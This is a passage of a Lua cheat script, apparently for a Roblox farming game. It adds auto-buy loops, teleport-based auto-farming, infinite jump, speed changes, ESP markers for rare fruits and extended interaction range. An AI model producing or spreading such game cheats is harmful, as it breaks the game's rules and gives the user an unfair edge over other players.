local function AutoBuySeeds(Value)
    Autobuyseeds = Value
    if Autobuyseeds then
        while Autobuyseeds do
            local boughtAny = false
            for _, seedName in ipairs({"Carrot", "Strawberry", "Blueberry", "Tomato", "Corn", "Watermelon", "Pumpkin", "Apple",
                "Bamboo", "Coconut", "Cactus", "Dragon", "Mango", "Lemon", "Pear", "Daffodil", "Grape", "Mushroom", "Orange Tulip", "Pepper", "Cacao", "Beanstalk", "Ember Lily", "Sugar Apple"}) do -- Directly using the seed names
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuySeedStock"):FireServer(seedName)
                    boughtAny = true
                end)
                task.wait(0.5)
            end
            if not boughtAny then
                print("No more seeds to buy, stopping auto-buy.")
                break
            end
            task.wait(0)
        end
    end
end

-- Add the auto buy seedstock toggle
PlayerTab:AddToggle({
    Name = "Auto Buy Seeds",
    Default = false,
    Callback = AutoBuySeeds
})

-- Auto Buy Gears
local Autobuygears = false
local gearstocks = {
    'Watering Can',
    'Basic Sprinkler',
    'Trowerl',
    'Recall Wrench',
    'Advanced Sprinkler',
    'Godly Sprinkler',
    'Lightning Rod',
    'Master Sprinkler',
}

local function AutoBuyGears(Value)
    Autobuygears = Value
    if Autobuygears then
        -- Instead of a single loop, use a loop that continues while Autobuygears is true
        while Autobuygears do
            local boughtAny = false -- Track if we bought anything in this iteration
            for _, gearName in ipairs(gearstocks) do
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyGearStock"):FireServer(gearName)
                    boughtAny = true -- Set to true if purchase is attempted
                end)
                task.wait(0.5)
            end
            if not boughtAny then
                -- If we didn't buy anything in this iteration, it might mean we're done
                print("No more gears to buy, stopping auto-buy.")
                break -- Exit the while loop
            end
            task.wait(1) -- Add a small delay to prevent excessive server requests, reduced from 5 to 1.
        end
    end
end

PlayerTab:AddToggle({
    Name = "Auto Buy Gears",
    Default = false,
    Callback = AutoBuyGears
})


-- Infinite Jump
local infiniteJumpEnabled = false
PlayerTab:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(Value)
        infiniteJumpEnabled = Value
    end
})

-- WalkSpeed Slider
PlayerTab:AddSlider({
    Name = "WalkSpeed",
    Min = 1,
    Max = 100,
    Default = 16,
    Increment = 1,
    ValueName = "Speed",
    Callback = function(Value)
        local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = Value
        end
    end
})
--Autofarm tab
local Autofarm = Window:MakeTab({
    Name = "Autofarm's",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
--autofarm
-- state
local autoTeleportFruits = false
local originalCFrame

-- helper to fire a proximity prompt once
local function firePrompt(prompt)
    prompt:InputHoldBegin()
    task.wait(prompt.HoldDuration or 0.1)
    prompt:InputHoldEnd()
end

-- core routine: teleport, configure, fire multiple times, then next
local function collectAllAndTeleport()
    local RunService  = game:GetService("RunService")
    local Players     = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    -- locate your Data folder
    local farmRoot = workspace:FindFirstChild("Farm")
    if not farmRoot then return warn("Farm not found") end

    local dataFolder
    for _, f in ipairs(farmRoot:GetChildren()) do
        if f.Name == "Farm" then
            local imp = f:FindFirstChild("Important")
            if imp then
                for _, df in ipairs(imp:GetChildren()) do
                    if df.Name == "Data"
                    and df:FindFirstChild("Owner")
                    and df.Owner.Value == LocalPlayer.Name then
                        dataFolder = df
                        break
                    end
                end
            end
        end
        if dataFolder then break end
    end
    if not dataFolder then return warn("Data folder not found") end

    local plants = dataFolder.Parent:FindFirstChild("Plants_Physical")
    if not plants then return warn("Plants_Physical missing") end

    -- gather every fruit part + prompt
    local tasks = {}
    for _, plant in ipairs(plants:GetChildren()) do
        local fruitsFolder = plant:FindFirstChild("Fruits")
        if fruitsFolder then
            for _, model in ipairs(fruitsFolder:GetChildren()) do
                for _, part in ipairs(model:GetChildren()) do
                    if part:IsA("BasePart") then
                        local prompt = part:FindFirstChildOfClass("ProximityPrompt")
                        if prompt then
                            table.insert(tasks, { part = part, prompt = prompt })
                        end
                    end
                end
            end
        end
    end

    if #tasks == 0 then 
        print("No fruit prompts to collect.") 
        return 
    end

    -- process each fruit
    for _, entry in ipairs(tasks) do
        if not autoTeleportFruits then return end
        local part, prompt = entry.part, entry.prompt
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        -- teleport above
        hrp.CFrame = part.CFrame * CFrame.new(0, 5, 0)
        RunService.Heartbeat:Wait()

        -- make prompt visible
        prompt.MaxActivationDistance = 100
        prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow

        -- fire it multiple times
        for i = 1, 3 do
            firePrompt(prompt)
            task.wait(0.1)
        end
    end

    print("Completed one pass of all fruits.")
end

-- UI toggle hookup
Autofarm:AddToggle({
    Name    = "Auto Farm Fruits",
    Default = false,
    Callback = function(on)
        autoTeleportFruits = on

        -- grab HRP once here
        local Players     = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local hrp         = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

        if on then
            -- save start pos
            if hrp then originalCFrame = hrp.CFrame end

            -- loop until toggled off
            spawn(function()
                while autoTeleportFruits do
                    collectAllAndTeleport()
                    task.wait(1)
                end
            end)
        else
            -- return to start
            if hrp and originalCFrame then
                hrp.CFrame = originalCFrame
                originalCFrame = nil
            end
        end
    end
})

-- autofarm swirls
-- Services and common locals
local Players      = game:GetService("Players")
local Workspace    = game:GetService("Workspace")
local RunService   = game:GetService("RunService")
local LocalPlayer  = Players.LocalPlayer
local RepStorage   = game:GetService("ReplicatedStorage")
-- State variables
local autoFarm          = false
local autoActivate      = false
local originalFarmCF    = nil
local originalCompCF    = nil
-- Compressor event
local HoneyMachineRE = RepStorage:WaitForChild("GameEvents"):WaitForChild("HoneyMachineService_RE")

-- Helper: Check if any compressor prompt exists (Onett or Jar)
local function compressorPromptExists()
    local interaction = Workspace:FindFirstChild("Interaction")
    local honeyEvent = interaction and interaction:FindFirstChild("UpdateItems") and interaction.UpdateItems:FindFirstChild("HoneyEvent")
    local compressor = honeyEvent and honeyEvent:FindFirstChild("HoneyCombpressor")
    if not compressor then return false end
    -- check both Onett and Jar
    for _, name in ipairs({"Onett","Spout"}) do
        local part = compressor:FindFirstChild(name)
        if part and part:FindFirstChild("HoneyCombpressorPrompt") then
            return true
        end
    end
    return false
end

-- Helper: find any tool containing "Pollinated"
local function findPollinatedTool()
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool.Name:match("Pollinated") then
            return tool
        end
    end
    return nil
end

-- Helper: collect/activate compressor via remote every 10s
local function activateCompressorCycle()
    -- equip pollinated tool
    local tool = findPollinatedTool()
    if tool and LocalPlayer.Character then
        LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
    -- fire server event
    pcall(function()
        HoneyMachineRE:FireServer("MachineInteract")
    end)
end

-- Gather honey tasks under your owned plot
local function getHoneyTasks()
    local farmRoot = Workspace:FindFirstChild("Farm")
    local dataFolder
    if farmRoot then
        for _, f in ipairs(farmRoot:GetChildren()) do
            if f.Name == "Farm" then
                local imp = f:FindFirstChild("Important")
                if imp then
                    for _, df in ipairs(imp:GetChildren()) do
                        if df.Name == "Data" and df:FindFirstChild("Owner") and df.Owner.Value == LocalPlayer.Name then
                            dataFolder = df
                            break
                        end
                    end
                end
            end
            if dataFolder then break end
        end
    end
    if not dataFolder then return {} end

    local tasks = {}
    local plants = dataFolder.Parent:FindFirstChild("Plants_Physical")
    if plants then
        for _, plant in ipairs(plants:GetChildren()) do
            local fruits = plant:FindFirstChild("Fruits")
            if fruits then
                for _, fruit in ipairs(fruits:GetChildren()) do
                    local part = fruit.PrimaryPart
                    if part and part:FindFirstChildWhichIsA("ParticleEmitter") then
                        local prompt = fruit:FindFirstChildWhichIsA("ProximityPrompt", true)
                        if prompt then
                            table.insert(tasks, {part=part,prompt=prompt})
                        end
                    end
                end
            end
        end
    end
    return tasks
end

-- Farm honey cycle
local function farmHoneyCycle()
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    for _, entry in ipairs(getHoneyTasks()) do
        if not autoFarm then break end
        -- pause if compressor active
        if autoActivate then break end
        -- teleport and fire prompt
        hrp.CFrame = entry.part.CFrame * CFrame.new(0,5,0)
        RunService.Heartbeat:Wait()
        entry.prompt.MaxActivationDistance = 100
        entry.prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
        for i=1,3 do
            entry.prompt:InputHoldBegin()
            task.wait(entry.prompt.HoldDuration or 0.1)
            entry.prompt:InputHoldEnd()
            task.wait(0.1)
        end
    end
end

-- Toggles & UI (assuming a UI library exists)
Autofarm:AddToggle({
    Name = "Auto Farm Honey",
    Default = false,
    Callback = function(on)
        autoFarm = on
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if on then
            originalFarmCF = hrp and hrp.CFrame
            spawn(function()
                while autoFarm do
                    farmHoneyCycle()
                    task.wait(1)
                end
            end)
        else
            if hrp and originalFarmCF then hrp.CFrame = originalFarmCF end
            originalFarmCF = nil
        end
    end
})

-- Services and common locals
local Players      = game:GetService("Players")
local Workspace    = game:GetService("Workspace")
local RunService   = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer  = Players.LocalPlayer
local HoneyMachineRE = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("HoneyMachineService_RE")

-- State variables
local autoCompressor    = false

-- Helper: Find valid Pollinated tool in backpack
local function findTool()
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool.Name:lower():find("pollinated") then
            return tool
        end
    end
    return nil
end

-- Toggle: Auto Submit Honey with Tool
Autofarm:AddToggle({
    Name    = "Auto Submit Honey Plants",
    Default = false,
    Callback = function(on)
        autoCompressor = on

        if on then
            spawn(function()
                while autoCompressor do
                    local tool = findTool()
                    if tool and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        LocalPlayer.Character.Humanoid:EquipTool(tool)
                    end
                    pcall(function()
                        HoneyMachineRE:FireServer("MachineInteract")
                    end)
                    task.wait(10)
                end
            end)
        end
    end
})

--Esp tab
local Esptab = Window:MakeTab({
    Name = "Esp's",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
local Players   = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- Helper: find the Model to parent our BillboardGui to
local function getBillboardTarget(obj)
    -- if the direct parent is a Model, use it
    if obj.Parent and obj.Parent:IsA("Model") then
        return obj.Parent
    end
    -- otherwise climb up until we hit a Model (or give up)
    return obj:FindFirstAncestorWhichIsA("Model")
end

-- Generic scanner: takes a filter and a label
local function scanFruits(filterFn, label)
    local farmContainer = Workspace:FindFirstChild("Farm")
    if not farmContainer then
        warn("Farm not found")
        return
    end

    local seen = {}

    for _, farmFolder in ipairs(farmContainer:GetChildren()) do
        if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
            local important = farmFolder:FindFirstChild("Important")
            if not important then continue end

            -- only your-owned plots
            local dataFolder
            for _, c in ipairs(important:GetChildren()) do
                if c:IsA("Folder") and c.Name == "Data" then
                    local owner = c:FindFirstChild("Owner")
                    if owner and owner.Value == LocalPlayer.Name then
                        dataFolder = c
                        break
                    end
                end
            end
            if not dataFolder then continue end

            local plants = important:FindFirstChild("Plants_Physical")
            if not plants then continue end

            for _, plant in ipairs(plants:GetChildren()) do
                for _, part in ipairs(plant:GetDescendants()) do
                    if part:IsA("BasePart") and not seen[part] then
                        for _, obj in ipairs(part:GetChildren()) do
                            if filterFn(obj) then
                                seen[part] = true
                                local targetModel = getBillboardTarget(obj)
                                if targetModel then
                                    print("Found "..label.." on:", plant.Name, "in", targetModel.Name)
                                    createBillboard(targetModel, plant.Name)
                                end
                                -- boost any prompts
                                for _, d in ipairs(part:GetDescendants()) do
                                    local prompt = d:FindFirstChildWhichIsA("ProximityPrompt")
                                    if prompt then
                                        prompt.MaxActivationDistance = 100
                                        prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
                                    end
                                end
                                break
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Bloodlit: under Effects folder, Lifetime = 2 to 3
local function scanBloodlitFruits()
    scanFruits(function(obj)
        return obj:IsA("ParticleEmitter")
           and obj.Name == "Swirls"
           and typeof(obj.Brightness) == "number"
           and obj.Brightness == 5
    end, "Bloodlit Fruit")
end


-- Rainbow: any ParticleEmitter named "Rainbow"
local function scanRainbowFruits()
    local farmContainer = Workspace:FindFirstChild("Farm")
    if not farmContainer then
        warn("Farm not found")
        return
    end

    local seenPlants = {}

    for _, farmFolder in ipairs(farmContainer:GetChildren()) do
        if not (farmFolder:IsA("Folder") and farmFolder.Name == "Farm") then
            continue
        end

        local important = farmFolder:FindFirstChild("Important")
        if not important then
            print("[Rainbow Debug] No Important in", farmFolder:GetFullName())
            continue
        end

        -- your-owned plots
        local dataFolder
        for _, c in ipairs(important:GetChildren()) do
            if c:IsA("Folder") and c.Name == "Data" then
                local owner = c:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer.Name then
                    dataFolder = c
                    break
                end
            end
        end
        if not dataFolder then
            print("[Rainbow Debug] No Data folder for player in", important:GetFullName())
            continue
        end

        local plants = important:FindFirstChild("Plants_Physical")
        if not plants then
            print("[Rainbow Debug] No Plants_Physical in", important:GetFullName())
            continue
        end

        for _, plant in ipairs(plants:GetChildren()) do
            print("[Rainbow Debug] Checking plant:", plant.Name)
            local fruits = plant:FindFirstChild("Fruits")
            if not fruits then
                print("  [Rainbow Debug]   No Fruits folder under plant", plant.Name)
                continue
            end

            for _, obj in ipairs(fruits:GetDescendants()) do
                -- log every attachment encountered
                if obj:IsA("Attachment") and obj.Name:lower() == "rainbow" then
                    print("  [Rainbow Debug]   Found Attachment.rainbow at:", obj:GetFullName())

                    for _, desc in ipairs(obj:GetDescendants()) do
                        if desc:IsA("ParticleEmitter") and desc.Name:lower() == "rainbow" then
                            print("    [Rainbow Debug]   Found ParticleEmitter 'rainbow' at:", desc:GetFullName())
                            if not seenPlants[plant] then
                                seenPlants[plant] = true
                                print("    [Rainbow Debug]   → MATCH on plant:", plant.Name)
                                createBillboard(plant, plant.Name)
                                -- boost prompts
                                for _, d in ipairs(plant:GetDescendants()) do
                                    local prompt = d:FindFirstChildWhichIsA("ProximityPrompt")
                                    if prompt then
                                        prompt.MaxActivationDistance = 100
                                        prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
                                    end
                                end
                            end
                            break
                        end
                    end
                end
            end
        end
    end
end



-- Golden: Shine_Particle emitters, billboard on enclosing Model
local function scanGoldenFruits()
    scanFruits(function(obj)
        return obj:IsA("ParticleEmitter")
           and obj.Name == "Shine_Particle"
    end, "Golden Fruit")
end
local function scanCelestialFruits()
    scanFruits(function(obj)
        return obj:IsA("ParticleEmitter") and obj.Name == "ParticleEmitter"
    end, "Celestial Fruit")
end


-- Buttons
Esptab:AddButton({
    Name = "ESP Celestial Fruit",
    Callback = scanCelestialFruits,
})

Esptab:AddButton({
    Name = "ESP Bloodlit Fruits",
    Callback = scanBloodlitFruits,
})

Esptab:AddButton({
    Name = "ESP Rainbow Fruits",
    Callback = scanRainbowFruits,
})

Esptab:AddButton({
    Name = "ESP Golden Fruits",
    Callback = scanGoldenFruits,
})

-- (Optionally) Clear previous billboards
local function clearAllBillboards()
    for _, gui in ipairs(Workspace:GetDescendants()) do
        if gui:IsA("BillboardGui") then
            gui:Destroy()
        end
    end
    print("Cleared all ESP billboards.")
end

Esptab:AddButton({
    Name = "Clear ESP Billboards",
    Callback = clearAllBillboards,
})


--autofarm



-- Main Tab
local MainTab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local SectionMain = MainTab:AddSection({
    Name = "Main"
})

-- Buy
local Selector1 = PlayerTab:AddDropdown({
    Name = "Buy",
    Default = "nothing",
    Options = {"nothing", "Carrot", "Strawberry", "Blueberry", "Tomato", "Corn", "Watermelon", "Pumpkin", "Apple",
        "Bamboo", "Coconut", "Cactus", "Dragon", "Mango", "Lemon", "Pear", "Daffodil", "Grape", "Mushroom", "Orange Tulip"},
    Callback = function(selectedFruit)
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9)
            :WaitForChild("BuySeedStock", 9e9)
            :FireServer(selectedFruit)
    end
})


-- Far Grab
local Selector2 = MainTab:AddDropdown({
    Name = "Far Grab",
    Default = "nothing",
    Options = {"nothing", "Strawberry", "Blueberry", "Peach", "Candy Blossom", "Tomato", "Corn", "Watermelon", "Pumpkin", "Apple",
"Bamboo", "Coconut", "Cactus", "Dragon Fruit", "Mango", "Raspberry", "Easter Egg", "Pear", "Lemon", "Daffodil",
"Grape", "Mushroom", "Orange Tulip", "Cranberry", "Durian", "Eggplant", "Venus Fly Trap", "Banana", "Pepper",
"Lotus", "Cherry Blossom", "Soul Fruit", "Cursed Fruit", "Passionfruit", "Chocolate Carrot", "Red Lollipop",
"Candy Sunflower", "Papaya", "Pineapple", "Cacao", "Nightshade", "Mint", "Glowshroom", "Moonflower", "Starfruit",
"Moonglow", "Blood Banana", "Moon Melon", "Celestiberry", "Moon Mango", "Beanstalk"},
    Callback = function(selectedFruit)
        local LocalPlayer = game:GetService("Players").LocalPlayer
        local Workspace = game:GetService("Workspace")
        local farmContainer = Workspace:FindFirstChild("Farm")
        if not farmContainer then
            warn("Farm container not found in Workspace.")
            return
        end
        local updatedCount = 0
        for _, farmFolder in pairs(farmContainer:GetChildren()) do
            if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
                local important = farmFolder:FindFirstChild("Important")
                if important then
                    local dataFolder = nil
                    for _, child in pairs(important:GetChildren()) do
                        if child:IsA("Folder") and child.Name == "Data" then
                            local owner = child:FindFirstChild("Owner")
                            if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
                                dataFolder = child
                                break
                            end
                        end
                    end
                    if dataFolder then
                        local plants = important:FindFirstChild("Plants_Physical")
                        if plants then
                            for _, plant in pairs(plants:GetChildren()) do
                                if plant.Name == selectedFruit then
                                    local fruitsFolder = plant:FindFirstChild("Fruits")
                                    if fruitsFolder then
                                        for _, model in pairs(fruitsFolder:GetChildren()) do
                                            for _, part in pairs(model:GetChildren()) do
                                                local prompt = part:FindFirstChild("ProximityPrompt")
                                                if prompt then
                                                    prompt.MaxActivationDistance = 100
                                                    prompt.Exclusivity = 'AlwaysShow'
                                                    updatedCount = updatedCount + 1
                                                end
                                            end
                                        end
                                    else
                                        warn("Couldn't find Fruits folder for: " .. plant.Name .. " in your farm.")
                                    end
                                end
                            end
                        else
                            warn("Couldn't find Plants_Physical folder in your farm.")
                        end
                    end
                end
            end
        end
        print("Updated " .. updatedCount .. " " .. selectedFruit .. " prompts in your farms.")
    end
})

-- Farm Number Display
local function displayFarmNumber()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local farmContainer = workspace:WaitForChild("Farm")
    for _, farmFolder in pairs(farmContainer:GetChildren()) do
        if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
            local important = farmFolder:FindFirstChild("Important")
            if important and important:IsA("Folder") then
                local data = important:FindFirstChild("Data")
                if data and data:IsA("Folder") then
                    local owner = data:FindFirstChild("Owner")
                    local farmNumber = data:FindFirstChild("Farm_Number")
                    if owner and farmNumber and owner:IsA("StringValue") then
                        if owner.Value == LocalPlayer.Name then
                            return "Your farm number is: " .. tostring(farmNumber.Value)
                        end
                    end
                end
            end
        end
    end
    return "Farm number not found."
end

local FarmNumberLabel = MainTab:AddLabel(displayFarmNumber())

spawn(function()
    while true do
        task.wait(5)
        FarmNumberLabel:Set(displayFarmNumber())
    end
end)
-- Toggle Stocks GUI
MainTab:AddButton({
    Name = "Create Stocks GUI",
    Callback = function()
        local function createStocksGUI(guiName, priorityFruitNames)
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
            local seedShopFrame = PlayerGui:FindFirstChild("Seed_Shop")
            if not seedShopFrame then
                warn("Seed_Shop GUI not found.")
                return nil
            end
            local scrollingFrame = seedShopFrame.Frame:FindFirstChild("ScrollingFrame")
            if not scrollingFrame then
                warn("ScrollingFrame not found in Seed_Shop.")
                return nil
            end
            local previousGUI = PlayerGui:FindFirstChild(guiName)
            if previousGUI then
                previousGUI:Destroy()
            end
            local stocksgui = Instance.new("ScreenGui")
            stocksgui.Name = guiName
            stocksgui.Enabled = false
            stocksgui.Parent = PlayerGui
            stocksgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            local Frame = Instance.new("Frame")
            local UIToolsGradient = Instance.new("UIGradient")
            local StocksLabel = Instance.new("TextLabel")
            local StocksDisplayFrame = Instance.new("Frame")
            local listLayout = Instance.new("UIListLayout")
            local stroke1 = Instance.new('UIGradient')
            local stroke2 = Instance.new('UIStroke')
            local stroke3 = Instance.new('UIStroke')
            stocksgui.Name = guiName
            stocksgui.Parent = PlayerGui
            stocksgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            stocksgui.Enabled = true
            Frame.Parent = stocksgui
            Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame.BackgroundTransparency = 0.300
            Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Frame.BorderSizePixel = 0
            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
            Frame.Position = UDim2.new(0.9202252635, 0, 0.541262135, 0)
            Frame.Size = UDim2.new(0.138597906, 0, 0.396440119, 0)
            UIToolsGradient.Color = ColorSequence.new {
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(29, 29, 29)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(47, 47, 47))
            }
            UIToolsGradient.Name = "UIToolsGradient"
            UIToolsGradient.Parent = Frame
            StocksLabel.Name = "Stocks"
            StocksLabel.Parent = Frame
            StocksLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            StocksLabel.BackgroundTransparency = 1.000
            StocksLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            StocksLabel.BorderSizePixel = 10
            StocksLabel.Position = UDim2.new(0.00581395347, 0, 0, 0)
            StocksLabel.Size = UDim2.new(0, 265, 0, 50)
            StocksLabel.Font = Enum.Font.Highway
            StocksLabel.Text = "Stock"
            StocksLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
            StocksLabel.TextSize = 51.000
            StocksLabel.TextStrokeColor3 = Color3.fromRGB(71, 0, 0)
            StocksLabel.TextStrokeTransparency = 0.000
            local Frame_2 = Instance.new("Frame")
            Frame_2.Parent = StocksLabel
            Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame_2.BackgroundTransparency = 1.000
            Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Frame_2.BorderSizePixel = 0
            Frame_2.Size = UDim2.new(0, 265, 0, 50)
            StocksDisplayFrame.Name = "StocksDisplay"
            StocksDisplayFrame.Parent = Frame
            StocksDisplayFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            StocksDisplayFrame.BackgroundTransparency = 1.000
            StocksDisplayFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            StocksDisplayFrame.BorderSizePixel = 0
            StocksDisplayFrame.Position = UDim2.new(0.00581395347, 0, 0.15408164, 0)
            StocksDisplayFrame.Size = UDim2.new(0, 200, 0, 300)
            StocksDisplayFrame.ClipsDescendants = true
            listLayout.Parent = StocksDisplayFrame
            listLayout.SortOrder = Enum.SortOrder.LayoutOrder
            listLayout.Padding = UDim.new(0, 2)
            stroke1.Parent = Frame
            stroke1.Color = ColorSequence.new {
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))
            }
            stroke1.Rotation = 0
            stroke2.Parent = Frame
            stroke2.Thickness = 3.2
            stroke2.Transparency = 0.22
            stroke3.Parent = Frame_2
            stroke3.Thickness = 3.2
            stroke3.Transparency = 0.22
            local function updateStockDisplay()
                for _, child in pairs(StocksDisplayFrame:GetChildren()) do
                    if child:IsA("TextLabel") then
                        child:Destroy()
                    end
                end
                local displayedFruits = {}
                if priorityFruitNames then
                    for _, fruitName in ipairs(priorityFruitNames) do
                        local fruitFrame = scrollingFrame:FindFirstChild(fruitName)
                        if fruitFrame and fruitFrame:IsA("Frame") and fruitFrame:FindFirstChild("Main_Frame") then
                            local mainFrame = fruitFrame:FindFirstChild("Main_Frame")
                            local stockTextLabel = mainFrame:FindFirstChild("Stock_Text")
                            if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                                local stockInfo = stockTextLabel.Text
                                local newTextLabel = Instance.new("TextLabel")
                                newTextLabel.Parent = StocksDisplayFrame
                                newTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                                newTextLabel.BackgroundTransparency = 1.000
                                newTextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                                newTextLabel.BorderSizePixel = 0
                                newTextLabel.Size = UDim2.new(1, -10, 0, 15)
                                newTextLabel.Font = Enum.Font.RobotoMono
                                newTextLabel.FontFace.Weight = Enum.FontWeight.Bold
                                newTextLabel.Text = fruitName .. ": " .. stockInfo
                                newTextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
                                newTextLabel.TextSize = 20.000
                                newTextLabel.TextWrapped = true
                                newTextLabel.TextXAlignment = Enum.TextXAlignment.Left
                                newTextLabel.TextYAlignment = Enum.TextYAlignment.Top
                                table.insert(displayedFruits, fruitName)
                            end
                        end
                    end
                end
                for _, itemFrame in pairs(scrollingFrame:GetChildren()) do
                    if itemFrame:IsA("Frame") and itemFrame:FindFirstChild("Main_Frame") and
                        not table.find(displayedFruits, itemFrame.Name) then
                        local mainFrame = itemFrame:FindFirstChild("Main_Frame")
                        local stockTextLabel = mainFrame:FindFirstChild("Stock_Text")
                        if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                            local fruitName = itemFrame.Name
                            local stockInfo = stockTextLabel.Text
                            local newTextLabel = Instance.new("TextLabel")
                            newTextLabel.Parent = StocksDisplayFrame
                            newTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                            newTextLabel.BackgroundTransparency = 1.000
                            newTextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                            newTextLabel.BorderSizePixel = 0
                            newTextLabel.Size = UDim2.new(1, -10, 0, 15)
                            newTextLabel.Font = Enum.Font.RobotoMono
                            newTextLabel.FontFace.Weight = Enum.FontWeight.Bold
                            newTextLabel.Text = fruitName .. ": " .. stockInfo
                            newTextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
                            newTextLabel.TextSize = 20.000
                            newTextLabel.TextWrapped = true
                            newTextLabel.TextXAlignment = Enum.TextXAlignment.Left
                            newTextLabel.TextYAlignment = Enum.TextYAlignment.Top
                        end
                    end
                end
            end
            updateStockDisplay()
            local function onDescendantAdded(child)
                if child:IsA("Frame") and child:FindFirstChild("Main_Frame") then
                    if priorityFruitNames then
                        updateStockDisplay()
                    else
                        local mainFrame = child:FindFirstChild("Main_Frame")
                        if mainFrame:FindFirstChild("Stock_Text") then
                            task.wait(0.1)
                            updateStockDisplay()
                        end
                    end
                end
            end
            local function onDescendantRemoved(child)
                if child:IsA("Frame") and child:FindFirstChild("Main_Frame") then
                    if priorityFruitNames then
                        updateStockDisplay()
                    else
                        local mainFrame = child:FindFirstChild("Main_Frame")
                        if mainFrame:FindFirstChild("Stock_Text") then
                            updateStockDisplay()
                        end
                    end
                end
            end
            task.spawn(function()
                while true do
                    if stocksgui and stocksgui.Parent then
                        updateStockDisplay()
                    else
                        break
                    end
                    task.wait(1)
                end
            end)
            scrollingFrame.DescendantAdded:Connect(onDescendantAdded)
            scrollingFrame.DescendantRemoved:Connect(onDescendantRemoved)
            return stocksgui
        end
        local rareFruits = {
            "Grape",
            "Dragon Fruit",
            "Mango",
            "Coconut",
            "Cactus",
            "Grape",
            "Mushroom"
        }
        local myStocksGUI = createStocksGUI("MyStocksGUI", rareFruits)
    end
})

SectionMain:AddButton({
    Name = "Shop",
    Callback = function()
        local Players = game:GetService("Players")
        local localPlayer = Players.LocalPlayer
        local shopgui = localPlayer.PlayerGui:WaitForChild("Seed_Shop"):WaitForChild("Frame")
        shopgui.Visible = true
    end
})

-- Sell Hand Keybind in Main Section
SectionMain:AddBind({
    Name = "Sell Hand",
    Default = Enum.KeyCode.X,
    Hold = false,
    Callback = function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local workspace = game:GetService("Workspace")
        local localPlayer = Players.LocalPlayer
        local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
        local rootPart = character:WaitForChild("HumanoidRootPart")
        local steven = workspace:WaitForChild("NPCS"):WaitForChild("Steven")
        local stevenHRP = steven:FindFirstChild("HumanoidRootPart")
        if not stevenHRP then
            warn("Steven has no HumanoidRootPart")
            return
        end
        local originalCFrame = rootPart.CFrame
        local offset = stevenHRP.CFrame.LookVector * 3
        rootPart.CFrame = stevenHRP.CFrame + offset
        task.wait(0.5)
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Item"):FireServer()
        task.wait(0.0000000000000001)
        rootPart.CFrame = originalCFrame
    end
})
--autoplant
